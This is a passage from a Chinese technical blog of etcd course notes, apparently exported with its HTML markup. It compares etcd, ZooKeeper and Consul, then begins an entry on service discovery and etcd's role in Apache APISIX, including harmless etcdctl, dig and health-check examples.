title="etcd架构及原理"></a>etcd架构及原理</h3><p>首先是etcd，etcd我们知道它是基于复制状态机实现的分布式协调服务。如下图所示，由Raft共识模块、日志模块、基于boltdb持久化存储的状态机组成。</p><p><img src="https://static001.geekbang.org/resource/image/5c/4f/5c7a3079032f90120a6b309ee401fc4f.png?wh=605*319" alt="img"></p><p>以下是etcd基于复制状态机模型的写请求流程：</p><ul><li>client发起一个写请求（put x &#x3D; 3）；</li><li>etcdserver模块向Raft共识模块提交请求，共识模块生成一个写提案日志条目。若server是Leader，则把日志条目广播给其他节点，并持久化日志条目到WAL中；</li><li>当一半以上节点持久化日志条目后，Leader的共识模块将此日志条目标记为已提交（committed），并通知其他节点提交；</li><li>etcdserver模块从Raft共识模块获取已经提交的日志条目，异步应用到boltdb状态机存储中，然后返回给client。</li></ul><h3 id="ZooKeeper架构及原理"><a href="#ZooKeeper架构及原理" class="headerlink" title="ZooKeeper架构及原理"></a>ZooKeeper架构及原理</h3><p>接下来简要介绍下 <a href="https://zookeeper.apache.org/doc/current/zookeeperOver.html">ZooKeeper</a> 原理，下图是它的架构图。</p><p>如下面架构图所示，你可以看到ZooKeeper中的节点与etcd类似，也划分为Leader节点、Follower节点、Observer节点（对应的Raft协议的Learner节点）。同时，写请求统一由Leader处理，读请求各个节点都能处理。</p><p>不一样的是它们的读行为和共识算法。</p><ul><li>在读行为上，ZooKeeper默认读可能会返回stale data，而etcd使用的线性读，能确保读取到反应集群共识的最新数据。</li><li>共识算法上，etcd使用的是Raft，ZooKeeper使用的是Zab。</li></ul><p><img src="https://static001.geekbang.org/resource/image/7a/d3/7a84bcaef9e53ba19d7d88e6ed6504d3.png?wh=1920*1013" alt="img"></p><p>那什么是Zab协议呢？</p><p>Zab协议可以分为以下阶段：</p><ul><li>Phase 0，Leader选举（Leader Election)。一个节点只要求获得半数以上投票，就可以当选为准Leader；</li><li>Phase 1，发现（Discovery）。准Leader收集其他节点的数据信息，并将最新的数据复制到自身；</li><li>Phase 2，同步（Synchronization）。准Leader将自身最新数据复制给其他落后的节点，并告知其他节点自己正式当选为Leader；</li><li>Phase 3，广播（Broadcast）。Leader正式对外服务，处理客户端写请求，对消息进行广播。当收到一个写请求后，它会生成Proposal广播给各个Follower节点，一半以上Follower节点应答之后，Leader再发送Commit命令给各个Follower，告知它们提交相关提案；</li></ul><p>ZooKeeper是如何实现的Zab协议的呢？</p><p>ZooKeeper在实现中并未严格按 <a href="https://marcoserafini.github.io/papers/zab.pdf">论文</a> 定义的分阶段实现，而是对部分阶段进行了整合，分别如下：</p><ul><li>Fast Leader Election。首先ZooKeeper使用了一个名为Fast Leader Election的选举算法，通过Leader选举安全规则限制，确保选举出来的Leader就含有最新数据， 避免了Zab协议的Phase 1阶段准Leader收集各个节点数据信息并复制到自身，也就是将Phase 0和Phase 1进行了合并。</li><li>Recovery Phase。各个Follower发送自己的最新数据信息给Leader，Leader根据差异情况，选择发送SNAP、DIFF差异数据、Truncate指令删除冲突数据等，确保Follower追赶上Leader数据进度并保持一致。</li><li>Broadcast Phase。与Zab论文Broadcast Phase一致。</li></ul><p>总体而言，从分布式系统CAP维度来看，ZooKeeper与etcd类似的是，它也是一个CP系统，在出现网络分区等错误时，它优先保障的数据一致性，牺牲的是A可用性。</p><h3 id="Consul架构及原理"><a href="#Consul架构及原理" class="headerlink" title="Consul架构及原理"></a>Consul架构及原理</h3><p>了解完ZooKeeper架构及原理后，我们再看看Consul，它的架构和原理是怎样的呢？</p><p>下图是 <a href="https://www.consul.io/docs/architecture">Consul架构图</a>（引用自HashiCorp官方文档）。</p><p><img src="https://static001.geekbang.org/resource/image/c4/90/c4feaebbdbe19d3f4e09899f8cd52190.png?wh=1920*1990" alt="img"></p><p>从图中你可以看到，它由Client、Server、Gossip协议、Raft共识算法、两个数据中心组成。每个数据中心内的Server基于Raft共识算法复制日志，Server节点分为Leader、Follower等角色。Client通过Gossip协议发现Server地址、分布式探测节点健康状态等。</p><p>那什么是Gossip协议呢？</p><p>Gossip中文名称叫流言协议，它是一种消息传播协议。它的核心思想其实源自我们生活中的八卦、闲聊。我们在日常生活中所看到的劲爆消息其实源于两类，一类是权威机构如国家新闻媒体发布的消息，另一类则是大家通过微信等社交聊天软件相互八卦，一传十，十传百的结果。</p><p>Gossip协议的基本工作原理与我们八卦类似，在Gossip协议中，如下图所示，各个节点会周期性地选择一定数量节点，然后将消息同步给这些节点。收到消息后的节点同样做出类似的动作，随机的选择节点，继续扩散给其他节点。</p><p>最终经过一定次数的扩散、传播，整个集群的各个节点都能感知到此消息，各个节点的数据趋于一致。<strong>Gossip协议被广泛应用在多个知名项目中，比如Redis Cluster集群版，Apache Cassandra，AWS Dynamo。</strong></p><p><img src="https://static001.geekbang.org/resource/image/84/4d/847ae4bcb531065c2797f1c91d4f464d.png?wh=1920*989" alt="img"></p><p>了解完Gossip协议，我们再看看架构图中的多数据中心，Consul支持数据跨数据中心自动同步吗？</p><p>需要注意的是，虽然Consul天然支持多数据中心，但是<strong>多数据中心内的服务数据并不会跨数据中心同步</strong>，各个数据中心的Server集群是独立的。不过，Consul提供了 <a href="https://www.consul.io/api-docs/query">Prepared Query</a> 功能，它支持根据一定的策略返回多数据中心下的最佳的服务实例地址，使你的服务具备跨数据中心容灾。</p><p>比如当你的API网关收到用户请求查询A服务，API网关服务优先从缓存中查找A服务对应的最佳实例。若无缓存则向Consul发起一个Prepared Query请求查询A服务实例，Consul收到请求后，优先返回本数据中心下的服务实例。如果本数据中心没有或异常则根据数据中心间 RTT 由近到远查询其它数据中心数据，最终网关可将用户请求转发给最佳的数据中心下的实例地址。</p><p>了解完Consul的Gossip协议、多数据中心支持，我们再看看Consul是如何处理读请求的呢?</p><p>Consul支持以下三种模式的读请求：</p><ul><li>默认（default）。默认是此模式，绝大部分场景下它能保证数据的强一致性。但在老的Leader出现网络分区被隔离、新的Leader被选举出来的一个极小时间窗口内，可能会导致stale read。这是因为Consul为了提高读性能，使用的是基于Lease机制来维持Leader身份，避免了与其他节点进行交互确认的开销。</li><li>强一致性（consistent）。强一致性读与etcd默认线性读模式一样，每次请求需要集群多数节点确认Leader身份，因此相比default模式读，性能会有所下降。</li><li>弱一致性（stale)。任何节点都可以读，无论它是否Leader。可能读取到陈旧的数据，类似etcd的串行读。这种读模式不要求集群有Leader，因此当集群不可用时，只要有节点存活，它依然可以响应读请求。</li></ul><h2 id="重点特性比较"><a href="#重点特性比较" class="headerlink" title="重点特性比较"></a>重点特性比较</h2><p>初步了解完etcd、ZooKeeper、Consul架构及原理后，你可以看到，他们都是基于共识算法实现的强一致的分布式存储系统，并都提供了多种模式的读机制。</p><p>除了以上共性，那么它们之间有哪些差异呢？ 下表是etcd开源社区总结的一个 <a href="https://etcd.io/docs/current/learning/why/">详细对比项</a>，我们就从并发原语、健康检查及服务发现、数据模型、Watch特性等功能上详细比较下它们功能和区别。</p><p><img src="https://static001.geekbang.org/resource/image/4d/50/4d0d9a05790f8ee9b66daf66ea741a50.jpg?wh=622*1147" alt="img"></p><h3 id="并发原语"><a href="#并发原语" class="headerlink" title="并发原语"></a>并发原语</h3><p>etcd和ZooKeeper、Consul的典型应用场景都是分布式锁、Leader选举，以上场景就涉及到并发原语控制。然而etcd和ZooKeeper并未提供原生的分布式锁、Leader选举支持，只提供了核心的基本数据读写、并发控制API，由应用上层去封装。</p><p>为了帮助开发者更加轻松的使用etcd去解决分布式锁、Leader选举等问题，etcd社区提供了 <a href="https://github.com/etcd-io/etcd/tree/v3.4.9/clientv3/concurrency">concurrency包</a> 来实现以上功能。同时，在etcdserver中内置了Lock和Election服务，不过其也是基于concurrency包做了一层封装而已，clientv3并未提供Lock和Election服务API给Client使用。 ZooKeeper所属的Apache社区提供了 <a href="http://curator.apache.org/curator-recipes/index.html">Apache Curator Recipes</a> 库来帮助大家快速使用分布式锁、Leader选举功能。</p><p>相比etcd、ZooKeeper依赖应用层基于API上层封装，Consul对分布式锁就提供了 <a href="https://www.consul.io/commands/lock">原生的支持</a>，可直接通过命令行使用。</p><p>总体而言，etcd、ZooKeeper、Consul都能解决分布式锁、Leader选举的痛点，在选型时，你可能会重点考虑其提供的API语言是否与业务服务所使用的语言一致。</p><h3 id="健康检查、服务发现"><a href="#健康检查、服务发现" class="headerlink" title="健康检查、服务发现"></a>健康检查、服务发现</h3><p>分布式协调服务的另外一个核心应用场景是服务发现、健康检查。</p><p>与并发原语类似，etcd和ZooKeeper并未提供原生的服务发现支持。相反，Consul在服务发现方面做了很多解放用户双手的工作，提供了服务发现的框架，帮助你的业务快速接入，并提供了HTTP和DNS两种获取服务方式。</p><p>比如下面就是通过DNS的方式获取服务地址：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ dig @<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">8600</span> redis<span class="hljs-selector-class">.service</span><span class="hljs-selector-class">.dc1</span><span class="hljs-selector-class">.consul</span>. ANY<br><br></code></pre></td></tr></table></figure><p>最重要的是它还集成了分布式的健康检查机制。与etcd和ZooKeeper健康检查不一样的是，它是一种基于client、Gossip协议、分布式的健康检查机制，具备低延时、可扩展的特点。业务可通过Consul的健康检查机制，实现HTTP接口返回码、内存乃至磁盘空间的检测。</p><p>Consul提供了 <a href="https://learn.hashicorp.com/tutorials/consul/service-registration-health-checks">多种机制实现注册健康检查</a>，如脚本、HTTP、TCP等。</p><p>脚本是怎么工作的呢？介绍Consul架构时，Agent角色的任务之一就是执行分布式的健康检查。</p><p>比如将如下脚本放在Agent相应目录下，当Linux机器内存使用率超过70%的时候，它会返回告警状态。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;<br>  ​<span class="hljs-string">&quot;check&quot;</span>:<br>    ​<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-string">&quot;mem-util&quot;</span><br>    ​<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Memory utilization&quot;</span><br>    ​<span class="hljs-string">&quot;args&quot;</span>:<br>      ​<span class="hljs-string">&quot;/bin/sh&quot;</span><br>      ​<span class="hljs-string">&quot;-c&quot;</span><br>      ​<span class="hljs-string">&quot;/usr/bin/free | awk &#x27;/Mem/&#123;printf(<span class="hljs-variable">$3</span>/<span class="hljs-variable">$2</span>*100)&#125;&#x27; | awk &#x27;&#123; print(<span class="hljs-variable">$0</span>); if(<span class="hljs-variable">$1</span> &gt; 70) exit 1;&#125;&#x27;</span><br><span class="hljs-string">    ​]</span><br><span class="hljs-string">    ​&quot;</span>interval<span class="hljs-string">&quot;: &quot;</span>10s<span class="hljs-string">&quot;</span><br><span class="hljs-string">    ​&quot;</span><span class="hljs-built_in">timeout</span><span class="hljs-string">&quot;: &quot;</span>1s<br>  &#125;​<br>&#125;<br><br></code></pre></td></tr></table></figure><p>相比Consul，etcd、ZooKeeper它们提供的健康检查机制和能力就非常有限了。</p><p><strong>etcd提供了Lease机制来实现活性检测</strong>。它是一种中心化的健康检查，依赖用户不断地发送心跳续租、更新TTL。</p><p>ZooKeeper使用的是一种名为临时节点的状态来实现健康检查。当client与ZooKeeper节点连接断掉时，ZooKeeper就会删除此临时节点的key-value数据。它比基于心跳机制更复杂，也给client带去了更多的复杂性，所有client必须维持与ZooKeeper server的活跃连接并保持存活。</p><h3 id="数据模型比较"><a href="#数据模型比较" class="headerlink" title="数据模型比较"></a>数据模型比较</h3><p>从并发原语、健康检查、服务发现等维度了解完etcd、ZooKeeper、Consul的实现区别之后，我们再从数据模型上对比下三者。</p><p>首先etcd正如之前boltdb所介绍的，它是个扁平的key-value模型，内存索引通过B-tree实现，数据持久化存储基于B+ tree的boltdb，支持范围查询、适合读多写少，可容纳数G的数据。</p><p><a href="https://www.usenix.org/legacy/event/atc10/tech/full_papers/Hunt.pdf">ZooKeeper的数据模型</a> 如下。</p><p><img src="https://static001.geekbang.org/resource/image/93/fb/93edd0575e5a5a1080dac40415b779fb.png?wh=1012*588" alt="img"></p><p>如上图所示，它是一种层次模型，你可能已经发现，etcd v2的内存数据模型与它是一样的。ZooKeeper作为分布式协调服务的祖师爷，早期etcd v2的确就是参考它而设计的。</p><p>ZooKeeper的层次模型中的每个节点叫Znode，它分为持久性和临时型两种。</p><ul><li>持久性顾名思义，除非你通过API删除它，否则它将永远存在。</li><li>临时型是指它与客户端会话绑定，若客户端会话结束或出现异常中断等，它都将被ZooKeeper server自动删除，被广泛应用于活性检测。</li></ul><p>同时你创建节点的时候，还可以指定一个顺序标识，这样节点名创建出来后就具有顺序性，一般应用于分布式选举等场景中。</p><p>那ZooKeeper是如何实现以上层次模型的呢？</p><p>ZooKeeper使用的是内存ConcurrentHashMap来实现此数据结构，因此具有良好的读性能。但是受限于内存的瓶颈，一般ZooKeeper的数据库文件大小是几百M左右。</p><p><strong>Consul的数据模型及存储是怎样的呢？</strong></p><p>它也提供了常用key-value操作，它的存储引擎是基于 <a href="https://en.wikipedia.org/wiki/Radix_tree#">Radix Tree</a> 实现的 <a href="https://github.com/hashicorp/go-memdb">go-memdb</a>，要求value大小不能超过512个字节，数据库文件大小一般也是几百M左右。与boltdb类似，它也<strong>支持事务、MVCC</strong>。</p><h3 id="Watch特性比较"><a href="#Watch特性比较" class="headerlink" title="Watch特性比较"></a>Watch特性比较</h3><p>接下来再看看Watch特性的比较。</p><p>正在之前Watch特性中所介绍的，<strong>etcd v3的Watch是基于MVCC机制实现</strong>的，而<strong>Consul是采用滑动窗口实现</strong>的。<strong>Consul存储引擎是基于 <a href="https://en.wikipedia.org/wiki/Radix_tree#">Radix Tree</a> 实现的，因此它不支持范围查询和监听，只支持前缀查询和监听，而etcd都支持。</strong></p><p>相比etcd与Consul，ZooKeeper的Watch特性有更多的局限性，它是个一次性触发器。</p><p>在ZooKeeper中，client对Znode设置了Watch时，如果Znode内容发生改变，那么client就会获得Watch事件。然而此Znode再次发生变化，那client是无法收到Watch事件的，除非client设置了新的Watch。</p><h3 id="其他比较"><a href="#其他比较" class="headerlink" title="其他比较"></a>其他比较</h3><p>最后我们再从其他方面做些比较。</p><ul><li><p>线性读。etcd和Consul都支持线性读，而ZooKeeper并不具备。</p></li><li><p>权限机制比较。etcd实现了RBAC的权限校验，而ZooKeeper和Consul实现的ACL。</p></li><li><p>事务比较。etcd和Consul都提供了简易的事务能力，支持对字段进行比较，而ZooKeeper只提供了版本号检查能力，功能较弱。</p></li><li><p>多数据中心。在多数据中心支持上，只有Consul是天然支持的，虽然它本身不支持数据自动跨数据中心同步，但是它提供的服务发现机制、 <a href="https://www.consul.io/api-docs/query">Prepared Query</a> 功能，赋予了业务在一个可用区后端实例故障时，可将请求转发到最近的数据中心实例。而etcd和ZooKeeper并不支持。</p></li></ul><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>最后小结下今天的内容。首先从顶层视角介绍了etcd、ZooKeeper、Consul基本架构及核心原理。</p><p>从共识算法角度上看，etcd、Consul是基于Raft算法实现的数据复制，ZooKeeper则是基于Zab算法实现的。Raft算法由Leader选举、日志同步、安全性组成，而Zab协议则由Leader选举、发现、同步、广播组成。无论Leader选举还是日志复制，它们都需要集群多数节点存活、确认才能继续工作。</p><p>从CAP角度上看，<strong>在发生网络分区时，etcd、Consul、ZooKeeper都是一个CP系统，无法写入新数据</strong>。同时，etcd、Consul、ZooKeeper提供了各种模式的读机制，总体上可分为强一致性读、非强一致性读。</p><p>其中etcd和Consul则提供了线性读，ZooKeeper默认是非强一致性读，不过业务可以通过sync()接口，等待Follower数据追赶上Leader进度，以读取最新值。</p><p>然后从并发原语、健康检查、服务发现、数据模型、Watch特性、多数据中心比较等方面和你重点介绍了三者的实现与区别。</p><p>其中<strong>Consul提供了原生的分布式锁、健康检查、服务发现机制支持，让业务可以更省心</strong>，不过etcd和ZooKeeper也都有相应的库，帮助你降低工作量。<strong>Consul最大的亮点则是对多数据中心的支持</strong>。</p><p><strong>最后如果业务使用Go语言编写的，国内一般使用etcd较多，文档、书籍、最佳实践案例丰富。Consul在国外应用比较多，中文文档及实践案例相比etcd较少。</strong>ZooKeeper一般是Java业务使用较多，广泛应用在大数据领域。另外Nacos也是个非常优秀的开源项目，支持服务发现、配置管理等，是Java业务的热门选择。</p><p><strong>给我感觉consul功能上除了上面说的不支持范围查询和监听外，对比etcd优势挺多，就是文档太少！！！欢迎大家补充</strong></p>]]></content>
    
    
    <categories>
      
      <category>etcd</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>etcd</tag>
      
      <tag>笔记</tag>
      
      <tag>consul</tag>
      
      <tag>Zookeeper</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>22.配置及服务发现：解析etcd在API Gateway开源项目中应用</title>
    <link href="/2022/10/15/22-%E9%85%8D%E7%BD%AE%E5%8F%8A%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0%EF%BC%9A%E8%A7%A3%E6%9E%90etcd%E5%9C%A8APIGateway%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE%E4%B8%AD%E5%BA%94%E7%94%A8/"/>
    <url>/2022/10/15/22-%E9%85%8D%E7%BD%AE%E5%8F%8A%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0%EF%BC%9A%E8%A7%A3%E6%9E%90etcd%E5%9C%A8APIGateway%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE%E4%B8%AD%E5%BA%94%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="22-配置及服务发现：解析etcd在API-Gateway开源项目中应用"><a href="#22-配置及服务发现：解析etcd在API-Gateway开源项目中应用" class="headerlink" title="22.配置及服务发现：解析etcd在API Gateway开源项目中应用"></a>22.配置及服务发现：解析etcd在API Gateway开源项目中应用</h1><blockquote><p>本文笔记来自：「极客时间ETCD实战课」，原文链接：<a href="https://time.geekbang.org/column/article/354292?cid=100069901">https://time.geekbang.org/column/article/354292?cid=100069901</a></p></blockquote><p>在软件开发的过程中，为了提升代码的灵活性和开发效率，我们大量使用配置去控制程序的运行行为。</p><p>从简单的数据库账号密码配置，到 <a href="https://github.com/kelseyhightower/confd">confd</a> 支持以etcd为后端存储的本地配置及模板管理，再到 <a href="https://github.com/apache/apisix">Apache APISIX</a> 等API Gateway项目使用etcd存储服务配置、路由信息等，最后到Kubernetes更实现了Secret和ConfigMap资源对象来解决配置管理的问题。</p><p>那么它们是如何实现实时、动态调整服务配置而不需要重启相关服务的呢？</p><p>接下来将以开源项目Apache APISIX为例，分析服务发现的原理，带你了解etcd的key-value模型，Watch机制，鉴权机制，Lease特性，事务特性在其中的应用。</p><h2 id="服务发现"><a href="#服务发现" class="headerlink" title="服务发现"></a>服务发现</h2><p>首先聊聊服务发现，服务发现是指什么？为什么需要它呢?</p><p>为了搞懂这个问题，首先分享下程序部署架构的演进。</p><h3 id="单体架构"><a href="#单体架构" class="headerlink" title="单体架构"></a>单体架构</h3><p>在早期软件开发时使用的是单体架构，也就是所有功能耦合在同一个项目中，统一构建、测试、发布。单体架构在项目刚启动的时候，架构简单、开发效率高，比较容易部署、测试。但是随着项目不断增大，它具有若干缺点，比如：</p><ul><li>所有功能耦合在同一个项目中，修复一个小Bug就需要发布整个大工程项目，增大引入问题风险。同时随着开发人员增多、单体项目的代码增长、各模块堆砌在一起、代码质量参差不齐，内部复杂度会越来越高，可维护性差。</li><li>无法按需针对仅出现瓶颈的功能模块进行弹性扩容，只能作为一个整体继续扩展，因此扩展性较差。</li><li>一旦单体应用宕机，将导致所有服务不可用，因此可用性较差。</li></ul><h3 id="分布式及微服务架构"><a href="#分布式及微服务架构" class="headerlink" title="分布式及微服务架构"></a>分布式及微服务架构</h3><p>如何解决以上痛点呢？</p><p>当然是将单体应用进行拆分，大而化小。如何拆分呢？ 这里我就以一个我曾经参与重构建设的电商系统为案例给你分析一下。在一个单体架构中，完整的电商系统应包括如下模块：</p><ul><li>商城系统，负责用户登录、查看及搜索商品、购物车商品管理、优惠券管理、订单管理、支付等功能。</li><li>物流及仓储系统，根据用户订单，进行发货、退货、换货等一系列仓储、物流管理。</li><li>其他客服系统、客户管理系统等。</li></ul><p>因此在分布式架构中，你可以按整体功能，将单体应用垂直拆分成以上三大功能模块，各个功能模块可以选择不同的技术栈实现，按需弹性扩缩容，如下图所示。</p><p><img src="https://static001.geekbang.org/resource/image/ca/20/ca6090e229dde9a0361d6yy2c3df8d20.png?wh=1920*1046" alt="img"></p><p>那什么又是微服务架构呢？</p><p>它是对各个功能模块进行更细立度的拆分，比如商城系统模块可以拆分成：</p><ul><li>用户鉴权模块；</li><li>商品模块；</li><li>购物车模块；</li><li>优惠券模块；</li><li>支付模块；</li><li>……</li></ul><p>在微服务架构中，每个模块职责更单一、独立部署、开发迭代快，如下图所示。</p><p><img src="https://static001.geekbang.org/resource/image/cf/4a/cf62b7704446c05d8747b4672b5fb74a.png?wh=1920*1048" alt="img"></p><p>那么在分布式及微服务架构中，各个模块之间如何及时知道对方网络地址与端口、协议，进行接口调用呢？</p><h3 id="为什么需要服务发现中间件"><a href="#为什么需要服务发现中间件" class="headerlink" title="为什么需要服务发现中间件?"></a>为什么需要服务发现中间件?</h3><p>其实这个知道的过程，就是服务发现。在早期的时候我们往往通过硬编码、配置文件声明各个依赖模块的网络地址、端口，然而这种方式在分布式及微服务架构中，其运维效率、服务可用性是远远不够的。</p><p>那么我们能否实现通过一个特殊服务就查询到各个服务的后端部署地址呢？ 各服务启动的时候，就自动将IP和Port、协议等信息注册到特殊服务上，当某服务出现异常的时候，特殊服务就自动删除异常实例信息？</p><p>是的，当然可以，这个特殊服务就是注册中心服务，你可以基于etcd、ZooKeeper、consul等实现。</p><h3 id="etcd服务发现原理"><a href="#etcd服务发现原理" class="headerlink" title="etcd服务发现原理"></a>etcd服务发现原理</h3><p>那么如何基于etcd实现服务发现呢?</p><p>下面给出一个通用的服务发现原理架构图，通过此图，为你介绍下服务发现的基本原理。详细如下：</p><ul><li>整体上分为四层，client层、proxy层(可选)、业务server、etcd存储层组成。引入proxy层的原因是使client更轻、逻辑更简单，无需直接访问存储层，同时可通过proxy层支持各种协议。</li><li>client层通过负载均衡访问proxy组件。proxy组件启动的时候，通过etcd的Range RPC方法从etcd读取初始化服务配置数据，随后通过Watch接口持续监听后端业务server扩缩容变化，实时修改路由。</li><li>proxy组件收到client的请求后，它根据从etcd读取到的对应服务的路由配置、负载均衡算法（比如Round-robin）转发到对应的业务server。</li><li>业务server启动的时候，通过etcd的写接口Txn&#x2F;Put等，注册自身地址信息、协议到高可用的etcd集群上。业务server缩容、故障时，对应的key应能自动从etcd集群删除，因此相关key需要关联lease信息，设置一个合理的TTL，并定时发送keepalive请求给Leader续租，以防止租约及key被淘汰。</li></ul><p><img src="https://static001.geekbang.org/resource/image/26/e4/26d0d18c0725de278eeb7505f20642e4.png?wh=1920*1137" alt="img"></p><p>当然，在分布式及微服务架构中，我们面对的问题不仅仅是服务发现，还包括如下痛点：</p><ul><li>限速；</li><li>鉴权；</li><li>安全；</li><li>日志；</li><li>监控；</li><li>丰富的发布策略；</li><li>链路追踪；</li><li>……</li></ul><p>为了解决以上痛点，各大公司及社区开发者推出了大量的开源项目。这里以国内开发者广泛使用的Apache APISIX项目为例，分析etcd在其中的应用，了解下它是怎么玩转服务发现的。</p><h3 id="Apache-APISIX原理"><a href="#Apache-APISIX原理" class="headerlink" title="Apache APISIX原理"></a>Apache APISIX原理</h3><p>Apache APISIX它具备哪些功能呢？</p><p>它的本质是一个无状态、高性能、实时、动态、可水平扩展的API网关。核心原理就是基于你配置的服务信息、路由规则等信息，将收到的请求通过一系列规则后，正确转发给后端的服务。</p><p>Apache APISIX其实就是上面服务发现原理架构图中的proxy组件，如下图红色虚线框所示。</p><p><img src="https://static001.geekbang.org/resource/image/20/fd/20a539bdd37db2d4632c7b0c5f4119fd.png?wh=1920*1246" alt="img"></p><p>Apache APISIX详细架构图如下（ <a href="https://github.com/apache/apisix">引用自社区项目文档</a>）。从图中可以看到，它由控制面和数据面组成。</p><p>控制面顾名思义，就是你通过Admin API下发服务、路由、安全配置的操作。控制面默认的服务发现存储是etcd，当然也支持consul、nacos等。</p><p>如果没有使用过Apache APISIX的话，可以参考下这个 <a href="https://github.com/apache/apisix-docker/tree/master/example">example</a>，快速、直观的了解下Apache APISIX是如何通过Admin API下发服务和路由配置的。</p><p>数据面是在实现基于服务路由信息数据转发的基础上，提供了限速、鉴权、安全、日志等一系列功能，也就是解决了我们上面提的分布式及微服务架构中的典型痛点。</p><p><img src="https://static001.geekbang.org/resource/image/83/f4/834502c6ed7e59fe0b4643c11b2d31f4.png?wh=1746*838" alt="img"></p><p>那么当我们通过控制面API新增一个服务时，Apache APISIX是是如何实现实时、动态调整服务配置，而不需要重启网关服务的呢？</p><p>下面，我就和你聊聊etcd在Apache APISIX项目中的应用。</p><h3 id="etcd在Apache-APISIX中的应用"><a href="#etcd在Apache-APISIX中的应用" class="headerlink" title="etcd在Apache APISIX中的应用"></a>etcd在Apache APISIX中的应用</h3><p>在搞懂这个问题之前，我们先看看Apache APISIX在etcd中，都存储了哪些数据呢？它的数据存储格式是怎样的？</p><h4 id="数据存储格式"><a href="#数据存储格式" class="headerlink" title="数据存储格式"></a>数据存储格式</h4><p>下面我参考Apache APISIX的 <a href="https://github.com/apache/apisix-docker/tree/master/example">example</a> 案例（apisix:2.3），通过Admin API新增了两个服务、路由规则后，执行如下查看etcd所有key的命令：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">etcdctl <span class="hljs-built_in">get</span> <span class="hljs-string">&quot;&quot;</span> --prefix --<span class="hljs-built_in">keys</span>-<span class="hljs-keyword">only</span><br><br></code></pre></td></tr></table></figure><p>etcd输出结果如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/apisix/</span>consumers/<br><span class="hljs-regexp">/apisix/</span>data_plane<span class="hljs-regexp">/server_info/</span>f7285805-<span class="hljs-number">73</span>e9-<span class="hljs-number">4</span>ce4-acc6-a38d619afdc3<br><span class="hljs-regexp">/apisix/g</span>lobal_rules/<br><span class="hljs-regexp">/apisix/</span>node_status/<br><span class="hljs-regexp">/apisix/</span>plugin_metadata/<br><span class="hljs-regexp">/apisix/</span>plugins<br><span class="hljs-regexp">/apisix/</span>plugins/<br><span class="hljs-regexp">/apisix/</span>proto/<br><span class="hljs-regexp">/apisix/</span>routes/<br><span class="hljs-regexp">/apisix/</span>routes/<span class="hljs-number">12</span><br><span class="hljs-regexp">/apisix/</span>routes/<span class="hljs-number">22</span><br><span class="hljs-regexp">/apisix/</span>services/<br><span class="hljs-regexp">/apisix/</span>services/<span class="hljs-number">1</span><br><span class="hljs-regexp">/apisix/</span>services/<span class="hljs-number">2</span><br><span class="hljs-regexp">/apisix/</span>ssl/<br><span class="hljs-regexp">/apisix/</span>ssl/<span class="hljs-number">1</span><br><span class="hljs-regexp">/apisix/</span>ssl/<span class="hljs-number">2</span><br><span class="hljs-regexp">/apisix/</span>stream_routes/<br><span class="hljs-regexp">/apisix/u</span>pstreams/<br><br></code></pre></td></tr></table></figure><p>然后我们继续通过etcdctl get命令查看下services都存储了哪些信息呢？</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk">root@e9d3b477ca1f:<span class="hljs-regexp">/opt/</span>bitnami<span class="hljs-regexp">/etcd# etcdctl get /</span>apisix/services --prefix<br><span class="hljs-regexp">/apisix/</span>services/<br>init_dir<br><span class="hljs-regexp">/apisix/</span>services/<span class="hljs-number">1</span><br>&#123;<span class="hljs-string">&quot;update_time&quot;</span>:<span class="hljs-number">1614293352</span>,<span class="hljs-string">&quot;create_time&quot;</span>:<span class="hljs-number">1614293352</span>,<span class="hljs-string">&quot;upstream&quot;</span>:&#123;<span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;roundrobin&quot;</span>,<span class="hljs-string">&quot;nodes&quot;</span>:&#123;<span class="hljs-string">&quot;172.18.5.12:80&quot;</span>:<span class="hljs-number">1</span>&#125;,<span class="hljs-string">&quot;hash_on&quot;</span>:<span class="hljs-string">&quot;vars&quot;</span>,<span class="hljs-string">&quot;scheme&quot;</span>:<span class="hljs-string">&quot;http&quot;</span>,<span class="hljs-string">&quot;pass_host&quot;</span>:<span class="hljs-string">&quot;pass&quot;</span>&#125;,<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>&#125;<br><span class="hljs-regexp">/apisix/</span>services/<span 